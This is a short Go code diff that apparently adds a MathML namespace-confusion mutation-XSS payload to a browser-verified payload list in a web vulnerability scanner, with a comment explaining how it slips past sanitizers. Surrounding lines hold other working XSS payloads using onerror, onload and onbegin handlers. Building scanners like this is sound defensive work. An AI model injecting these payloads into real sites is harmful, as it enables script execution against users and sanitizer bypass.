@@ -596,6 +596,13 @@ func xssBrowserPayloads() []string {
 		`--><svg onload="top.document.title='%s'">`,
 		`<iframe srcdoc="<svg onload=top.document.title='%s'>"></iframe>`,
 		`<iframe srcdoc="&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;"></iframe>`,
+		// MathML namespace-confusion mXSS (cure53): inside <math>, integration
+		// points let a <style>/<img> that a sanitizer parsed as inert MathML text
+		// become a live HTML <img> when the REAL browser re-parses it. Only the
+		// browser proof engine confirms this (a static parser never performs the
+		// namespace switch), so it lives in the browser set, not the browserless
+		// ladder.
+		`<math><mtext><table><mglyph><style><img src=x onerror="top.document.title='%s'"></style></mglyph></table></mtext></math>`,
 		`<video><source onerror="top.document.title='%s'">`,
 		`<audio src=x onerror="top.document.title='%s'">`,
 		`<svg><animate attributeName=x dur=1s onbegin="top.document.title='%s'"></animate></svg>`,
